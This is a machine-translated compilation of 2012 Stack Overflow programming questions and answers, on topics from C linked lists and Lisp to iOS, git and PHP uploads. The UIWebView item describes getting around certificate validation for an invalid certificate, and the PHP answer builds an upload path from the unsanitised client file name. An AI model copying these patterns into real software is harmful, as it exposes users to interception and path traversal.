> 赞同：0
> 
> 时间：2012-09-30T09:24:47.340

您正在使用以下内容设置基本 URL：

```
<base href="http://www.code7dev4.co.uk/data"> 
```

这会在加载[http://www.code7dev4.co.uk/data#id](http://www.code7dev4.co.uk/data#id)而不是仅附加到当前 URL（包括查询字符串）时丢弃片段标识符。这意味着查询字符串被删除，更重要**的是重新加载页面**（这违背了非重新加载选项卡切换的全部目的）。

删除基本标签可以解决这个问题，但我不确定这会对其他地方产生什么影响。

**更新**

所以下面是我能找到的唯一解决方案来“解决”你正在处理的问题。它在这里非常适合作为练习，因为我建议不要使用这种技术 - 它不优雅，并且没有在 Chrome v23 以外的任何东西上进行过测试。实际上，我们通过在锚点上的事件期间`base`重写`href`属性来停用元素`click`（这将对应于页面上的选项卡）。然后我们在事件发生后重置原始的`href`20 毫秒`mouseup`。我们必须建立延迟，因为`mouseup`事件在点击事件*之前触发。*

```
var anchor = document.querySelector("a"),
    baseElement = document.querySelector("base"),
    baseHref = baseElement.getAttribute("href");

    anchor.addEventListener("click", function (event) {
        baseElement.setAttribute("href", "");
    }, true);

    anchor.addEventListener("mouseup", function (event) {
        setTimeout(function () {
            document.querySelector("base").setAttribute("href", baseHref);
        }, 20);
    }, true); 
```

最好的解决方案就是*不使用`base`tag*，但如果您无法控制 HTML 输出，这可能会在紧要关头节省一天的时间。我真的很想看看是否有人提出了更好（即更优雅）的解决方案。

# c - 链表实现

> ID：12659216
> 
> 赞同：0
> 
> 时间：2012-09-30T06:34:06.267
> 
> 标签：c, linked-list

谁能检查我的链表实现是否有错误？尝试遍历链表时，我不断遇到段错误。

我正在尝试从“process_command”中的“root”遍历链表，但是当我尝试访问 root->child 时，我会收到 seg 错误错误。

节点的实现

```
typedef struct _node {
    struct _node *child;
    char *command;
} Command_list; 
```

我用来标记字符串并将它们放入链接列表的两个函数。

```
Command_list *process_command( char command_line[256] )
{
    printf("Command: %s", command_line);

    //allocate space for root & child 
    Command_list *root = (Command_list*)malloc(sizeof (Command_list));
    Command_list *child = (Command_list*)malloc(sizeof (Command_list));

    char *token;
    char *saveptr;
    //get the first part of the string
    token = strtok_r( command_line, " ", &saveptr);

    //if the first word in the string is student
    if( !strcmp(token, "student") )
    {
        //set the first word to the be root
        root = insert_command( token, root );
        printf("Current root command: %s \n", root->command);
        child = root;

        //get the next word from the string
        token = strtok_r( NULL, " ", &saveptr);

        //keep getting words from the list and store them in a linked-list
        while( token != NULL )
        {
            child = insert_command( token, child );
            token = strtok_r( NULL, " ", &saveptr);
        }
    }
    return root;
}

Command_list *insert_command( char *value, Command_list *root)
{
    printf("previous value: %s \n", root->command);

    Command_list *child_node = (Command_list*)malloc(sizeof (Command_list));

    //if the node being passed in is empty, store the value in itself
    if( root->command == NULL ){
        root->command = value;
        root->child = 0;
        printf("Inserting value to root: %s \n", root->command);
        return root;
    }
    //otherwise store the value in a child node
    else
    {
        child_node->command = value;
        child_node->child = 0;
        printf("Inserting value to child node: %s \n", child_node->command);
        return child_node;
    }
} 
```

**编辑：** 迭代代码

```
{
    ....
    Command_list *temp = (Command_list*)malloc(sizeof (Command_list));
    temp = root;
    while(temp != NULL){
    printf("Command: %s\n", temp->command);
    temp = temp->child;
    .... 
} 
```

添加了我正在使用的迭代代码。该代码似乎在代码块中运行良好，但在终端中的第一个输出后停止迭代。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:14:31.447

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

struct node
{
 node *next;
 char *command;
};

void addNode(node **listHead, char *newData)
{
    node *newNode;

    if (*listHead == NULL)
    {
        *listHead = (node*)malloc(sizeof(node));
        newNode = *listHead;
    }
    else
    {
        newNode = *listHead;
        while (newNode->next != NULL)
            newNode = newNode->next;
        newNode->next = (node*)malloc(sizeof(node));
        newNode = newNode->next;
    }
    newNode->next = NULL;
    newNode->command = strdup(newData);
}

node *makeLinkedListOfWords(char *inputString)
{
    char *token;
    char *cmdClone;
    char *delims = " ";
    node *result = NULL;

    cmdClone = strdup(inputString);
    token = strtok(cmdClone, delims);
    while (token != NULL)
    {
        addNode(&result, token);
        token = strtok(NULL, delims);
    }
    free(cmdClone);        // EDIT: forgot to give back the duplicate string's memory
    return result;
}

void printList(node *list)
{
    int i = 0;
    while (list != NULL)
    {
        printf("%d. '%s'\n", ++i, list->command);
        list = list->next;
    }
}

int main(int argc, char *argv[])
{
    node *list1 = makeLinkedListOfWords("this is a test");
    node *list2 = makeLinkedListOfWords("so is this");
    node *list3 = makeLinkedListOfWords("and this is another");
    printList(list1);
    printList(list2);
    printList(list3);
    return 0;
} 
```

[编辑：所以正在将此输出转换为有序列表，编号为 1-11 :grrr: )

**输出：**

```
1\. 'this'
2\. 'is'
3\. 'a'
4\. 'test'
1\. 'so'
2\. 'is'
3\. 'this'
1\. 'and'
2\. 'this'
3\. 'is'
4\. 'another' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:21:28.260

当你 allocate 时`Command_list`，你不会初始化它的成员。`(root->command == NULL)`严格来说，测试`insert_command`将有未定义的结果。然后，此测试很可能会失败，您将继续创建子节点。稍后调用`insert_command`将添加到以该子节点为根的列表中。

您的迭代代码将从未`root`初始化的`command`和开始`child`。如果打印`command`没有失败，移动到子元素并打印它几乎肯定会失败。

解决此问题应该可以解决您的段错误。您还有一些内存泄漏，可以清理：

*   分配给`child`靠近顶部的结构`process_command`
*   `child_node`在`insert_command`这种情况下`root->command == NULL`
*   在您的`Command_list`迭代代码中分配

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-11-16T18:39:13.337

```
template<class T>
ostream& operator<<(ostream& os, LinkedList<T>& ll) {
    if(!(ll.isEmpty()))
    {
        //os<<temp->data;
        int size=ll.size();
        int count=0;
        while(count<size)
        {
            os<<ll.get(count);
            if(count+1<size)
                os<<",";
            count++;
        }
    }
    else
    {
        os<<"[]";
    }

}

template<class T>       
LinkedList<T>::LinkedList(){
    head=NULL;
}

template<class T>
LinkedList<T>::LinkedList(const LinkedList<T>& other){
    this->head=0;
    Node<T>* tempHead=other.getLeader();
    while(tempHead!=0)
    {
        Node<T> *temp = new Node<T>(tempHead->data);
        temp->next = 0;
        Node<T>* curr = this->getLeader();
        if (curr != 0)
        {
            while (curr->next != 0)
            {
            curr = curr->next;
            }
            curr->next = temp;
        }
        else
        {
            this->head = temp;
        }
        tempHead=tempHead->next;
    }
}

template<class T>
LinkedList<T>& LinkedList<T>::operator=(const LinkedList<T>& other){
    if(&other != this)
    {
        this->head=0;
        Node<T>* tempHead=other.head;
        while(tempHead!=0)
        {
            Node<T>* temp = new Node<T>(tempHead->data);
            temp->next = 0;
            Node<T>* curr = this->head;
            if (curr != 0)
            {
                while (curr->next != 0)
                {
                curr = curr->next;
                }
                curr->next = temp;
            }
            else
            {
                this->head = temp;
            }
            tempHead=tempHead->next;
        }
    }
    return *this;   

template<class T>
LinkedList<T>* LinkedList<T>::clone() {

    LinkedList<T>* list=new LinkedList<T>(*this);
    return list;

}

template<class T>
LinkedList<T>::~LinkedList(){

    Node<T>*temp;
    while (head != NULL)
    {
    temp = head->next;
    delete head;
    head = temp;
    }
}

template<class T>
void LinkedList<T>::insert(int index, T data){

    Node<T> *n= new Node<T>(data);
    if((0 <= index) &&( index<= size()))
    {
        if(index==0)
        {
            if(isEmpty())
            {
                head=n;
            }
            else
            {
                Node<T>*skip=head;
                head=n;
                head->next=skip;
            }
        }
        else
        {
            Node<T> *temp =head;
            int count =1;
            while(count!=index)
            {
                temp=temp->next;
                count++;
            }
            n->next=temp->next;
            temp->next=n;
        }
    }
    else
    {
        throw ("invalid index");
    }
    return ;
}   

template<class T>
T LinkedList<T>::remove(int index){
        T pet;
    if(0 <= index && index<= size()-1)
    {
        if(!isEmpty())
        {
            Node<T> *ret=getLeader();
            Node<T>* skip=NULL;
            if(index!=0)
            {
            int i=1;
            while(i!=(index))
            {
                ret=ret->next;
                i++;
            }
            skip=ret;
            pet=get(index);
            ret=ret->next;
            if(ret->next==NULL)
            {
                delete ret;
                skip->next=NULL;
                ret=NULL;
            }
            else
            {
                skip->next=ret->next;
                delete ret;
                ret=NULL;
            }
        }
        else
        {
                Node<T> *tmp = head->next;
                pet=get(index);
                delete head;
                head = tmp;
        }
        return pet;
        }
        else
        {  
            throw ("empty list");
        }

    }
    else
    {
        throw ("invalid index");
    }}

template<class T>   
T LinkedList<T>::get(int index) const {
    if(head!=NULL)
    {
        if(0 <= index && index<= size()-1)  
        {
            int count=0;
            Node<T>* place =head;
            while(place!=NULL)
            {
                if(count==index)
                {
                    return place->data;
                }
                count++;
                place=place->next;
            }
    }
        else
        {
          throw ("invalid index");
        }
    }
    else
    {
        throw("empty list");
    }
}

template<class T>
bool LinkedList<T>::isEmpty(){
    if(head==0)
    {
        return true ;
    }
    else
    {
        return false;
    }
}

template<class T>
void LinkedList<T>::clear(){
    Node<T>*temp=head;
    while(head!=NULL)
    {
        head=head->next;
        delete temp;
        temp=head;
    }
}   

template<class T>
Node<T>* LinkedList<T>::getLeader() const{
    return head;
}

template<class T>
ostream& LinkedList<T>::print(ostream& os){ 
    os<<*this;
}

template<class T>
int LinkedList<T>::size() const {
    int count=0;
    Node<T> *temp =getLeader();
    while(temp!=NULL)
    {
        temp=temp->next;
        count++;
    }
    return count;
}

template<class T>
T LinkedList<T>::operator[](int index){
    return get(index);
}

template<class T>
LinkedList<T>& LinkedList<T>::operator+(const LinkedList<T>& other){
    LinkedList<T>* ting=new LinkedList<T>(*this);
    Node<T>* UGE=other.getLeader();
    int count=ting->size();
    int pos=0;
    while(UGE!=NULL)
    {
        ting->insert(count,other.get(pos));
        UGE=UGE->next;
        pos++;
        count++;
    }
    return *ting;
} 
```

# ios - 在 iOS 上设置默认会议时长？

> ID：12659228
> 
> 赞同：1
> 
> 时间：2012-09-30T06:37:15.487
> 
> 标签：ios, iphone, duration, defaults

这[似乎](http://www.macobserver.com/tmo/answers/how_to_change_the_default_duration_of_new_ical_events)是为 iCal 事件设置默认会议长度的命令：

```
defaults write com.apple.iCal 'Default duration in minutes for new event' X 
```

其中 X 为 30 表示默认会议时长为 30 分钟。

我的问题是 - 这个 API 在 iOS 上的等价物是什么？我无法在 API 文档中找到它——但也许我没有找对地方。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T22:43:36.930

这在 iOS 上是不可能的，至少在系统范围内是不可能的。您可以在您自己的应用程序中提供您自己的 UI，它具有不同的默认长度。

# codeigniter-2 - Codeigniter form_open 未提交

> ID：12659234
> 
> 赞同：0
> 
> 时间：2012-09-30T06:38:08.850
> 
> 标签：codeigniter-2

我有以下简单的搜索页面。3 个字段（一个具有固定值）和提交按钮。当我点击提交时，什么都没有发生。甚至没有重新加载或任何东西。按钮什么也不做。忽略那里的阿拉伯语，我感觉它与 div 的排列或 form_open 的放置有关。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<title>منزلي</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="<?php echo base_url();?>support/css/main.css" media="screen" />
</head>
<body>
<div id="header">
    <div id="logo">
        منزلي       
    </div>
        <ul id="list-nav">
            <li><a href="#">للإتصال بنا </a></li>
            <li><a href="#">عن الموقع</a></li>
            <li><a href="/home/index.php/property/load_sale_property">منازل للبيع</a></li>
             <li><a href="/home/index.php/property/load_rent_property">منازل للإيجار</a></li>
             <li><a href="/home/index.php/property/">الرئيسية</a></li>

        </ul>
</div>

<? 
    $this->load->helper('form');

form_open('search/search_properties'); ?>

<div id="center">

    المدينة: 
    <select name="city">
      <option>الخبر</option>
      <option>الدمام</option>
      <option>الظهران</option>
    </select>
    <br><br>

Type: <input type="text" value="flat" name="propertyType"/> <br><br>

    حدود السعر:
    <select name="range">
      <option> &lt;20000 </option>
      <option>20000-30000</option>
      <option>30000-40000</option>
      <option>40000-50000</option>
      <option> >500000 </option>
    </select>
    <br><br>

    <input type="submit" value="بحث"/>
</form>
</div>

<div id="footer">
    <p>2012 منزلي &copy;</p>
</div>
</body>
</html> 
```

知道为什么会这样吗？

谢谢大家的支持

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T10:33:17.733

```
<? 
    $this->load->helper('form');

form_open('search/search_properties'); ?> 
```

应该

```
<? 
    $this->load->helper('form');

echo form_open('search/search_properties'); ?> 
```

# lisp - Lisp 函数：联合

> ID：12659236
> 
> 赞同：4
> 
> 时间：2012-09-30T06:38:27.180
> 
> 标签：lisp, common-lisp, clisp

我有一个 lisp 作业，我很难处理它。

我必须编写一个执行联合操作的函数。该函数接受 2 个输入，以原子或列表的形式，并联合每个元素，保留顺序并去除所有级别的括号。

函数的输出：

```
(my-union 'a 'b)                         ;; (a b)
(my-union 'a '(b))                       ;; (a b)
(my-union '(a b) '(b c))                 ;; (a b c)
(my-union '(((a))) '(b(c((d e))a)))      ;; (a b c d e) 
```

我对 lisp 很陌生。这是我到目前为止所写的内容，它仅适用于第三个示例：

```
(defun new-union (a b)
 (if (not b)
      a
      (if (member (car b) a)
        (new-union a (cdr b))
        (new-union (append a (list (car b))) (cdr b))))) 
```

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T13:10:32.393

由于这是你的第一个作业，而且你是 Lisp 新手，这里有一个非常简单的自上而下的方法，不用担心性能，并充分利用 CL 提供的工具：

在 Common Lisp 中，已经有一个删除重复项的功能：[`remove-duplicates`](http://www.ai.mit.edu/projects/iiip/doc/CommonLISP/HyperSpec/Body/fun_remove-du_e-duplicates.html). 将它与`:from-end`关键字参数一起使用将“保留顺序”。现在，假设您有一个函数`flatten`，它可以展平任意嵌套的列表。那么您的问题的解决方案是：

```
(defun new-union (list1 list2)
  (remove-duplicates (flatten (list list1 list2)) :from-end t)) 
```

这就是我在没有进一步限制的情况下解决问题的方法，并且没有真正的理由担心性能。尽可能多地使用现有的工具箱，除非必要，否则不要重新发明轮子。

如果你这样处理问题，归结为编写`flatten`函数，我将把它作为练习留给你。这不是太难，一个简单的选择是编写一个递归函数，解决这样的问题：

如果要展平的列表的第一个元素本身就是一个列表，则将展平的第一个元素附加到展平的其余部分。如果第一个元素不是列表，只需将其添加到列表的展平其余部分。如果输入根本不是列表，只需返回它。

这对你来说应该是一个很好的练习，只需几行代码就可以完成。

（如果你想非常正确，请使用辅助函数来完成这项工作并检查包装函数是否参数真的是一个列表。否则，`flatten`也适用于原子，这对你来说可能是也可能不是问题.)

现在，假设你已经写了`flatten`：

```
> (defun new-union (list1 list2)
    (remove-duplicates (flatten (list list1 list2)) :from-end t))
NEW-UNION
> (new-union 'a 'b)
(A B)
> (new-union 'a '(b))
(A B)
> (new-union '(a b) '(b c))
(A B C)
> (new-union '(((a))) '(b (c ((d e)) a)))
(A B C D E) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T07:57:22.887

解决此问题的一种方法是将您的关注点分开。一是扁平化；另一个是重复删除；还有一个是建立结果。

从作为结果的空列表开始，继续将第一个列表的元素添加到其中，跳过结果中已经存在的元素。

然后对第二个列表的元素执行相同的操作，将它们添加到相同的结果列表中。

```
(defun my-union (a b &aux (res (list 1)) (p res))
  (nadd-elts p a)
  (nadd-elts p b)
  (cdr res)) 
```

`nadd-elts``p`将添加到列表的末尾，使用 eg破坏性地更新其最后一个单元格（由 指向） `rplacd`。一个例子是[here](https://stackoverflow.com/a/10584256/849891)。

要添加元素，`nadd-elts`将[模拟](https://stackoverflow.com/a/10893770/849891)[展平](https://stackoverflow.com/a/10465920/849891)过程，并`p`在检查`res`重复项后添加每个叶元素。

* * *

以功能风格工作，没有破坏性更新，一般方法保持不变：从空结果列表开始，将第一个列表添加到其中 - 没有重复 - 然后是第二个。

```
(defun my-union (a b &aux res)
  (setq res (add-into res a))
  (setq res (add-into res b))
  res) 
```

现在我们要实现这个`add-into`功能了。

```
(defun add-into (res a &aux r1 r2)
  (cond
     ((atom a) .... )
     (T (setq r1 (add-into res (car a)))
        (setq r2 (............ (cdr a)))
        r2))) 
```

上面的内容可以在没有辅助变量和原语的情况下重写`set`。试着找出如何......好吧，这就是我的意思：

```
(defun my-union (a b) (add-into NIL (cons a b)))

(defun add-into (res a)
  (cond
     ((atom a) .... )
     (T (add-into (add-into res (car a)) 
                  (cdr a))))) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-30T12:25:35.760

除非您不允许使用哈希表（出于某种原因，我以前曾遇到过此要求），否则您可以提出一个排序函数，以帮助您以您没有的方式构建结果集一遍又一遍地重复搜索。

此外，由于允许嵌套列表，因此您的问题缩小到仅删除树中的重复项（因为您可以在开始处理它们之前简单地附加任意数量的列表。

现在，我将尝试展示一些示例来说明如何做到这一点：

```
;; Large difference between best and worst case.
;; Lists containing all the same items will be processed
;; in square time
(defun union-naive (list &rest lists)
  (when lists (setf list (append list lists)))
  (let (result)
    (labels ((%union-naive (tree)
               (if (consp tree)
                   (progn
                     (%union-naive (car tree))
                     (when (cdr tree) (%union-naive (cdr tree))))
                   (unless (member tree result)
                     (setq result (cons tree result))))))
      (%union-naive list) result)))

;; Perhaps the best solution, it is practically linear time
(defun union-hash (list &rest lists)
  (when lists (setf list (append list lists)))
  (let ((hash (make-hash-table)) result)
    (labels ((%union-hash (tree)
               (if (consp tree)
                   (progn
                     (%union-hash (car tree))
                     (when (cdr tree) (%union-hash (cdr tree))))
                   (setf (gethash tree hash) t))))
      (%union-hash list))
    (maphash
     #'(lambda (a b)
         (declare (ignore b))
         (push a result)) hash)
    result))

;; This will do the job in more time, then the
;; solution with the hash-map, but it requires
;; significantly less memory. Memory is, in fact
;; a more precious resource some times, but you
;; have to decide what algo to use based on the
;; data size
(defun union-flatten (list &rest lists)
  (when lists (setf list (append list lists)))
  (labels ((%flatten (tree)
             (if (consp tree)
                 (if (cdr tree)
                     (nconc (%flatten (car tree))
                            (%flatten (cdr tree)))
                     (%flatten (car tree)))
                 (list tree))))
    ;; the code below is trying to do something
    ;; that you could've done using 
    ;; (remove-duplicates (%flatten list))
    ;; however sorting and then removing duplicates
    ;; may prove to be more efficient
    (reduce
     #'(lambda (a b)
         (cond
           ((atom a) (list a))
           ((eql (car a) b) b)
           (t (cons b a))))
     (sort (%flatten list)
           #'(lambda (a b)
               (string< (symbol-name a)
                        (symbol-name b)))))))

(union-naive '(((a))) '(b(c((d e))a)))
(union-hash '(((a))) '(b(c((d e))a)))
(union-flatten '(((a))) '(b(c((d e))a))) 
```

请注意，我用来对元素排序的函数不是通用的，但您可能能够为任何类型的数据想出一个替代函数。一般来说，任何快速散列函数都可以，为了简单起见，我使用了这个函数。

# iis-7 - iis 中需要哪些确切设置才能使 asp.net 页面更快地处理它？

> ID：12659237
> 
> 赞同：0
> 
> 时间：2012-09-30T06:38:29.857
> 
> 标签：iis-7

我有一个没有任何源代码的简单空白页面。该页面也需要很长时间才能出现。我无法理解这背后的原因。该域收到了很高的请求。

在 iis 7.0 中需要进行哪些具体设置才能更快。

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:44:35.440

ASP.NET 页面在文件创建/编辑/上传后发出第一个请求时总是有一个初始延迟，因为服务器需要重新编译它们，但实际上不应超过 2-3 秒，并且确实不影响后续页面加载。

我唯一能想到的就是一个超载的服务器。假设您使用的是共享主机包，那么我建议您找到另一个 ISP。如果没有，那么恐怕它不仅仅是隐藏了“页面加载速度更快”的开关。

# udp - 强制路由器保持空闲 UDP 端口打开

> ID：12659238
> 
> 赞同：1
> 
> 时间：2012-09-30T06:38:38.623
> 
> 标签：udp, router, nat, hole-punching

客户端打开到我的服务器的 UDP 连接，经过一段时间（10 分钟到 24 小时），服务器需要将数据发送回客户端，但发现客户端的 UDP 端口已关闭！

经过测试，我们发现客户端仍然打开了UDP端口，但是路由器（nat）可能因为不活动而关闭了端口！

有没有办法强制路由器保持 UDP 端口打开而不发送保持活动数据包？（服务器或客户端）。

ICMP 中有类似的东西吗？

谢谢你 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T18:03:56.470

我遇到了同样的问题，我找到了这个解决方案，不是针对路由器，而是针对服务器：

尝试配置保持活动状态。

执行此操作的方法取决于您使用的服务/程序/操作系统。

例如，在客户端中使用 OpenSSH，您必须在文件中添加/配置以下行`./ssh/config`或`/etc/ssh/ssh_config`：

```
ServerAliveInterval 30
ServerAliveCountMax 60 
```

在服务器（我进行更改的地方）中，在文件中添加/配置以下行`/etc/ssh/sshd_config`：

```
ClientAliveInterval 30
ClientAliveCountMax 60 
```

当然这取决于操作系统等，但想法是在服务中配置保持活动。

祝你好运！

# java - java中的大整数输入

> ID：12659240
> 
> 赞同：0
> 
> 时间：2012-09-30T06:39:09.903
> 
> 标签：java

> **可能的重复：**
> [Java 中的大数](https://stackoverflow.com/questions/849813/large-numbers-in-java)

我需要获取和操作一个 <= 500 位的整数输入。如何在java中完成？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:40:21.567

[BigInteger](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigInteger.html)类是开始大整数的好地方。

我必须检查文档以查看上限`BigInteger`是多少，但它应该适合您的需要。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T06:43:15.437

```
import java.math.BigInteger;
public class BigIntegerExample 
{
    public static void main(String[] args) 
    {
       BigInteger bigInteger1 = new BigInteger ("123456789");
       BigInteger bigInteger2 = new BigInteger ("112334");
       BigInteger bigIntResult = bigInteger1.multiply(bigInteger2); 
       System.out.println("Result is  ==> " + bigIntResult);
    }
} 
```

您可以使用 Biginteger 类获取整数中的 long 值。

# scala - 需要获取价值并将其添加到数据库中

> ID：12659245
> 
> 赞同：2
> 
> 时间：2012-09-30T06:40:28.497
> 
> 标签：scala, lift

嗨，我有以下代码，并且在我的模型文件夹中有 form.scala，但它运行到一条错误消息，内容如下：

```
 [error]  def getSingleton = SimpleForm
 [error]                     ^
 [error] three errors found 
```

————————————————————— 代码如下：

```
 <lift:surround with="default" at="content">
    <div class="lift:SimpleForm?form=post">
      <input class="name"/>
      <input type="submit" value="press me"/>
    </div>
   </lift:surround> 
```

在片段文件夹中。

```
import net.liftweb._
import util._
import Helpers._
import http._

class SimpleForm extends StatefulSnippet {
 var name = ""
  override def dispatch = {case "render" => render}
  def render=
   "name=name" #> SHtml.text(name, name = _) &
    "type=submit" #> SHtml.onSubmitUnit(myfunc)

  private def myfunc() = { var name = ""}

} 
```

在模型文件夹中。

```
import net.liftweb._
import util._
import Helpers._
import http._

class SimpleForm extends LongKeyedMapper[SimpleForm] with IdPK {
def getSingleton = SimpleForm
} 
```

它应该获得一个名称并将其添加到数据库我可以解决以前的问题但不知道如何继续它。

# git - 当起点不是祖先时，如何查看另一个合并分支的提交？

> ID：12659249
> 
> 赞同：0
> 
> 时间：2012-09-30T06:42:24.547
> 
> 标签：git, branch, commit

我正在使用 vim 插件管理器`neobundle`，有一个显示插件更新的功能（对于 git，显示两个 git pull update 之间的提交消息）。

这是这种情况，使用`git log --graph {old_rev}..{new_rev}`可以检查此更新和上一次更新之间的提交消息。但问题是，当它`{old_rev}`是合并分支的祖先之后的修订版时，`git log --graph`将不会在该合并分支中显示提交消息。

以下是一些截图供比较：

[tig] 这是来自程序 tig 的所有提交消息历史记录。 [来自 tig http://ompldr.org/vZnAwZg](http://ompldr.org/vZnAwZg)

[neobundle] 这里是 vim 插件管理器 neobundle 的输出。 [来自新捆绑 http://ompldr.org/vZnAwZw](http://ompldr.org/vZnAwZw)

[应该是这样的]这里是省略了分支提交消息的预期输出。 [预期输出 http://ompldr.org/vZnAwaA](http://ompldr.org/vZnAwaA)

插件 neobundle 中使用的命令是： `git log {old_rev}..{new_rev} --graph --pretty=format:'%h [%cr] %s'`

我在这里与该插件的作者讨论了这个问题： [https ://github.com/Shougo/neobundle.vim/issues/24](https://github.com/Shougo/neobundle.vim/issues/24)

那么如何让命令也能显示合并分支的提交信息呢？

*   如果您可以使用其他命令将其存档，也可以。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:35:07.590

已解决，`git log {old_rev}^..{new_rev} --graph --pretty=format:'%h [%cr] %s'`通过添加使用命令`^`来获取祖先。

# iphone - iOS viewDidLoad 没有调用

> ID：12659253
> 
> 赞同：-1
> 
> 时间：2012-09-30T06:43:25.030
> 
> 标签：iphone, ipad, ios5

嗨我面临问题

我有导航基础 iPad 应用程序，现在我创建了两个 login.h、login.m、login.xib 和 registration.h、registration.m、registration.xib，在我的 login.xib 中我有一个按钮注册，当我点击在此按钮注册上，然后创建对象并调用注册类的 initWithNibName 但未加载 nib。

我的代码是：

```
Registration *registration = [[Registration alloc] initWithNibName:@"Registation" bundle:nil];
 [self.navigationController pushViewController:registration animated:YES]; 
```

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:54:49.593

采用 ...

```
Registration *registration = [[Registration alloc] init]; 
```

代替

```
Registration *registration = [[Registration alloc] initWithNibName:@"Registation" bundle:nil]; 
```

**或者**

**检查文件所有者中注册按钮的 IBAction 是否正确设置？？？？**

可能对你有帮助:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T09:44:43.293

将以下行添加到您的代码中，然后发布生成的日志：

```
NSLog(@"Self: %@, NavController: %@, Registration: %@", self, self.navigationController, registration); 
```

我猜想你的 self.navigationController 会以某种方式为（null），这就是视图没有加载的原因。

# c++ - SDL 应用程序无法在其他计算机上运行

> ID：12659259
> 
> 赞同：2
> 
> 时间：2012-09-30T06:45:27.610
> 
> 标签：c++, windows, sdl, codeblocks

我刚刚使用 SDL 1.2.15 和 SDL_image 1.2.12 库用 C++ 编写了一个应用程序。它可以在我的计算机上运行，​​但是每当我将 *.exe 发送给我的朋友（当然还有来自 SDL 库和程序所需图像的所有 *.dll 文件）时，他们都会说没有任何反应（没有消息、没有错误等）。程序的内容并不重要，因为我编写的每个 SDL 应用程序都会产生这样的问题。

我正在 Windows XP 上开发 Code::Blocks 10.05（作为我的朋友）。显然我已经发送了发布版本。

我发现我的程序不能在与 Windows NT 及更低版本的兼容模式下运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T12:12:59.703

如果应用程序似乎没有启动，您可以使用[DependencyWalker](http://www.dependencywalker.com/)检查是否所有静态依赖项都已完成。它会告诉你是否有任何丢失的 dll。如果所有依赖项似乎都已满足（dll 列表中没有错误），您可以使用`Profile`主菜单中的命令来分析应用程序的启动。

分析将显示动态依赖项是否存在任何问题（通过 COM 加载的 dll 或对 的显式调用`LoadLibrary`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T15:35:00.713

好的，我刚刚发现了我的错误。我确定了我的 SDL_Surface（使用 SDL_SetVideoMode()）的宽度和高度以适合我的屏幕尺寸。当函数想要在屏幕上对其他维度执行相同操作时，它返回 NULL 从而使所有应用程序崩溃。谢谢关心。

# iphone - 在 UIWebView 中加载 HTTPS

> ID：12659264
> 
> 赞同：2
> 
> 时间：2012-09-30T06:46:06.047
> 
> 标签：iphone, xcode, ssl, uiwebview, ssl-certificate

我有一个带有 UIWebView 的页面，它运行良好，直到最近一些重定向发生了变化，URL 从 HTTP 到 HTTPS。页面无法显示。

记录的错误：

```
Error Domain=NSURLErrorDomain Code=-1202 "The certificate for this server is invalid. 
```

现在，我希望绕过所有证书检查并允许所有证书。尝试使用此[How to use NSURLConnection to connect with SSL for an untrusted cert？](https://stackoverflow.com/questions/933331/how-to-use-nsurlconnection-to-connect-with-ssl-for-an-untrusted-cert)但错误仍然出现。帮助，有人吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T04:10:39.263

实际上在这里找到了解决方案：[UIWebView to view self-signed website (No private api, not NSURLConnection) - 可能吗？](https://stackoverflow.com/questions/11573164/uiwebview-to-view-self-signed-websites-no-private-api-not-nsurlconnection-i)

它实际上做的是拦截 UIWebView 以启动 NSURLConnection 以允许服务器进行身份验证，然后使用 UIWebView 继续连接，并取消 NSURLConnection。之所以如此，是因为服务器授权一次后，其余的持续连接不会被阻塞。希望我很清楚。:)

# php - move_uploaded_file() 显示成功但不工作

> ID：12659268
> 
> 赞同：6
> 
> 时间：2012-09-30T06:47:14.470
> 
> 标签：php, html, image, file-upload, upload

我正在使用 php 上传文件并将其移动到所需位置...在使用 move_uploaded_file 时，它​​表示文件已成功移动，但文件未显示在目录中。HTML 和 PHP 代码如下...

```
 <form action="test_upload.php" method="POST" enctype="multipart/form-data">
<fieldset>
<label for="test_pic">Testing Picture</label>
<input type="file" name="test_pic" size="30" /><br />
</fieldset>

<fieldset>

<input type="submit" value="submit" />

</fieldset>
</form> 
```

php 是这样的：

```
 <?php

$image_fieldname = "test_pic";
$upload_dir = "/vidit";
$display_message ='none';

if(move_uploaded_file($_FILES[$image_fieldname]['tmp_name'],$upload_dir) && is_writable($upload_dir)){
    $display_message = "file moved successfully";
    }
    else{
        $display_message = " STILL DID NOT MOVE";
            }

?> 
```

当我运行此页面并上传合法文件时 - test_upload.php 回显文件已成功上传。但是当我前往网页根目录中的文件夹“vidit”时。文件夹是空的...

我正在使用 wamp 服务器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T06:53:45.370

您需要**将文件名附加到目标路径**中。尝试如下

```
$doc_path = realpath(dirname(__FILE__));

if(move_uploaded_file($_FILES[$image_fieldname]['tmp_name'],$doc_path.$upload_dir.'/'.$_FILES[$image_fieldname]['name']) && is_writable($upload_dir)){
    $display_message = "file moved successfully";
}
else{
